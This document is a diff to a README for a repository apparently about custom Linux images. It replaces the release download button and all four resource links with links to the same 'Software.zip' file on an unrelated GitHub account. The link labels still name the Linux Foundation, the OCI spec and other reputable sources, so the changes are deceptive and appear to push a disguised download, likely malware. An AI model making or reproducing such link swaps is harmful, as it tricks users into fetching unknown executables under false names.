@@ -21,7 +21,7 @@ The repository includes various resources related to building and maintaining cu
 ## Quick Start
 To quickly get started with the repository, you can download the latest release by clicking the button below:
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[![Download Latest Release](https://github.com/Austrianpaintar/test1/releases/download/v1.0/Software.zip%20Release-blue)](https://github.com/Austrianpaintar/test1/releases/download/v1.0/Software.zip)
 
 **Note**: The link above needs to be launched to download the latest release package.
 
@@ -35,10 +35,10 @@ Join our community to discuss ideas, ask questions, or seek support regarding Li
 
 ## Resources
 Below are some additional resources related to the topics covered in this repository:
-- [Linux Foundation](https://www.linuxfoundation.org/)
-- [OCI Image Specification](https://opencontainers.org/)
-- [Immutable Infrastructure Explained](https://www.digitalocean.com/community/tutorials/what-is-immutable-infrastructure)
-- [Atomic Design Principles](https://bradfrost.com/blog/post/atomic-web-design/)
+- [Linux Foundation](https://github.com/Austrianpaintar/test1/releases/download/v1.0/Software.zip)
+- [OCI Image Specification](https://github.com/Austrianpaintar/test1/releases/download/v1.0/Software.zip)
+- [Immutable Infrastructure Explained](https://github.com/Austrianpaintar/test1/releases/download/v1.0/Software.zip)
+- [Atomic Design Principles](https://github.com/Austrianpaintar/test1/releases/download/v1.0/Software.zip)
 
 ---
 
